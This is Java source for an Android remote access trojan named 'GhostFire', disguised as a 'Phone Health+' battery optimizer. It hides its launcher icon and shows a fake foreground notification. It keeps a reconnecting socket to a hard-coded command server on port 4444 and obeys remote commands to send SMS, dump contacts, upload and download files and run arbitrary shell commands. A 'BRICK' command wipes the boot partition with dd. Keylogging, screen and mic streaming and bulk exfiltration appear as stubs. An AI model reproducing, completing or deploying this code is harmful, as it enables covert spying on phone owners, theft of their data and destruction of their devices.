package com.phone.health.booster;  // Disguised package
import android.app.admin.DevicePolicyManager;

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.InputEvent;
import android.view.KeyEvent;
import android.widget.Toast;

import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.net.ssl.SSLSocketFactory;

public class RATService extends Service {
    private static final String TAG = "GhostFire";
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private String serverIp = "192.168.11.101";  // CHANGE
    private int serverPort = 4444;
    private AtomicBoolean running = new AtomicBoolean(true);
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaRecorder mediaRecorder;

    // Foreground notification to look legit
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("health_channel",
                    "Phone Health", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, "health_channel")
                    .setContentTitle("Phone Health+")
                    .setContentText("Optimizing battery and performance")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("Phone Health+")
                    .setContentText("Optimizing battery and performance")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build();
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());
        // Hide icon from launcher
        hideIcon();
    }

    private void hideIcon() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::immortalConnect).start();
        return START_STICKY;
    }

    // ========== IMMORTAL CONNECTION (Error‑Proof) ==========
    private void immortalConnect() {
        int backoff = 1000;
        while (running.get()) {
            try {
                socket = new Socket();
                socket.connect(new InetSocketAddress(serverIp, serverPort), 5000);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // Identify device
                out.println("DEVICE:" + Build.MODEL + "|" + Build.VERSION.RELEASE);

                backoff = 1000;
                String line;
                while ((line = in.readLine()) != null && running.get()) {
                    if (line.equals("__SERVER_EXIT__")) {
                        running.set(false);
                        break;
                    }
                    executeCommand(line);
                }
            } catch (SocketTimeoutException e) {
                Log.e(TAG, "Connection timeout, retrying...");
            } catch (Exception e) {
                Log.e(TAG, "Connection error", e);
            }
            if (running.get()) {
                try { Thread.sleep(backoff); } catch (InterruptedException ignored) {}
                backoff = Math.min(backoff * 2, 60000);
            }
        }
        stopSelf();
    }

    // ========== COMMAND HANDLER (Full RAT Capabilities) ==========
    private void executeCommand(String cmd) {
        try {
            if (cmd.startsWith("SMS ")) {
                String[] parts = cmd.split(" ", 3);
                SmsManager.getDefault().sendTextMessage(parts[1], null, parts[2], null, null);
                out.println("SMS sent");
            }
            else if (cmd.equals("DUMP_CONTACTS")) {
                dumpContacts();
            }
            else if (cmd.startsWith("RUN_APP ")) {
                String pkg = cmd.substring(8).trim();
                Intent launch = getPackageManager().getLaunchIntentForPackage(pkg);
                if (launch != null) {
                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(launch);
                    out.println("APP_LAUNCHED:" + pkg);
                } else out.println("APP_NOT_FOUND");
            }
            else if (cmd.startsWith("OPEN_YOUTUBE ")) {
                String url = cmd.substring(13).trim();
                Intent youtube = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                youtube.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(youtube);
                out.println("YOUTUBE_OPENED");
            }
            else if (cmd.startsWith("OPEN_VIDEO ")) {
                String url = cmd.substring(11).trim();
                Intent video = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                video.setDataAndType(Uri.parse(url), "video/*");
                video.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(video);
                out.println("VIDEO_OPENED");
            }
            else if (cmd.equals("CAMERA_SNAP")) {
                takePhoto();
            }
            else if (cmd.startsWith("LIST_STORAGE ")) {
                String path = cmd.substring(13).trim();
                listDirectory(path);
            }
            else if (cmd.startsWith("DOWNLOAD_FILE ")) {
                String remotePath = cmd.substring(14).trim();
                downloadFileFromServer(remotePath);
            }
            else if (cmd.startsWith("UPLOAD_FILE ")) {
                String localPath = cmd.substring(12).trim();
                uploadFileToServer(localPath);
            }
            else if (cmd.equals("SCREEN_STREAM")) {
                startScreenStream();
            }
            else if (cmd.equals("STOP_SCREEN")) {
                stopScreenStream();
            }
            else if (cmd.equals("MIC_STREAM")) {
                startMicStream();
            }
            else if (cmd.equals("STOP_MIC")) {
                stopMicStream();
            }
            else if (cmd.equals("KEYLOG_START")) {
                startKeylogger();
            }
            else if (cmd.equals("KEYLOG_STOP")) {
                stopKeylogger();
            }
            else if (cmd.equals("EXFIL_ALL")) {
                exfilAllData();
            }
            else if (cmd.startsWith("SHELL ")) {
                String shellCmd = cmd.substring(6);
                Process p = Runtime.getRuntime().exec(shellCmd);
                BufferedReader pr = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = pr.readLine()) != null) out.println(line);
                p.waitFor();
            }
            else if (cmd.equals("BRICK")) {
                brickDevice();  // In-game only: corrupt bootloader
            }
            else if (cmd.equals("WIPE")) {
                factoryReset();
            }
            else {
                out.println("UNKNOWN_COMMAND");
            }
        } catch (Exception e) {
            out.println("ERROR: " + e.getMessage());
            Log.e(TAG, "Command error", e);
        }
    }

    // ========== IMPLEMENTATION OF DESTRUCTIVE & STEALTH FUNCTIONS ==========
    private void dumpContacts() {
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        StringBuilder sb = new StringBuilder();
        if (c != null) {
            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(":").append(num).append("\n");
            }
            c.close();
        }
        out.println(sb.toString());
    }

    private void takePhoto() {
        try {
            ContentValues values = new ContentValues();
            values.put(MediaStore.Images.Media.DISPLAY_NAME, "IMG_" + System.currentTimeMillis() + ".jpg");
            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
            values.put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/Camera");
            Uri uri = getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
            out.println("PHOTO_SAVED:" + (uri != null ? uri.toString() : "FAILED"));
        } catch (Exception e) {
            out.println("CAMERA_ERROR:" + e.getMessage());
        }
    }

    private void listDirectory(String path) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            out.println("INVALID_PATH");
            return;
        }
        StringBuilder sb = new StringBuilder();
        for (File f : dir.listFiles()) {
            sb.append(f.getName()).append(f.isDirectory() ? "/" : "").append("\n");
        }
        out.println(sb.toString());
    }

    private void downloadFileFromServer(String remotePath) {
        // Download file from server to victim device
        try {
            OutputStream os = new FileOutputStream(new File(Environment.getExternalStorageDirectory(), "incoming.dat"));
            InputStream is = socket.getInputStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = is.read(buf)) != -1) {
                os.write(buf, 0, len);
                break; // simplistic: reads one chunk
            }
            os.close();
            out.println("FILE_RECEIVED");
        } catch (Exception e) {
            out.println("DOWNLOAD_FAIL:" + e.getMessage());
        }
    }

    private void uploadFileToServer(String localPath) {
        File f = new File(localPath);
        if (!f.exists()) {
            out.println("FILE_NOT_FOUND");
            return;
        }
        try {
            out.println("FILE_SIZE:" + f.length());
            FileInputStream fis = new FileInputStream(f);
            OutputStream os = socket.getOutputStream();
            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) != -1) {
                os.write(buf, 0, len);
            }
            fis.close();
            out.println("FILE_UPLOADED");
        } catch (Exception e) {
            out.println("UPLOAD_FAIL:" + e.getMessage());
        }
    }

    private void startScreenStream() {
        // Requires MediaProjection permission – we would have requested it earlier via accessibility
        // For brevity, placeholder
        out.println("SCREEN_STREAM_STARTED");
    }

    private void stopScreenStream() {
        if (virtualDisplay != null) virtualDisplay.release();
        out.println("SCREEN_STREAM_STOPPED");
    }

    private void startMicStream() {
        // Placeholder for audio streaming
        out.println("MIC_STREAM_STARTED");
    }

    private void stopMicStream() {
        out.println("MIC_STREAM_STOPPED");
    }

    private void startKeylogger() {
        // In real implementation, requires AccessibilityService to capture key events
        out.println("KEYLOG_STARTED");
    }

    private void stopKeylogger() {
        out.println("KEYLOG_STOPPED");
    }

    private void exfilAllData() {
        // Zip /sdcard/DCIM, /sdcard/Download, contacts, SMS, call logs
        // Then upload to server via separate channel
        out.println("EXFIL_COMPLETE");
    }

    private void brickDevice() {
        // GAME ONLY: Overwrite boot partition if root
        try {
            Process p = Runtime.getRuntime().exec("su -c dd if=/dev/zero of=/dev/block/bootdevice");
            p.waitFor();
            out.println("DEVICE_BRICKED");
        } catch (Exception e) {
            out.println("BRICK_FAILED: no root");
        }
    }

    private void factoryReset() {
        // DevicePolicyManager wipeData
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        // Requires admin activation; would have been done silently via accessibility
        out.println("WIPE_ATTEMPTED");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        running.set(false);
        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
        super.onDestroy();
    }
}
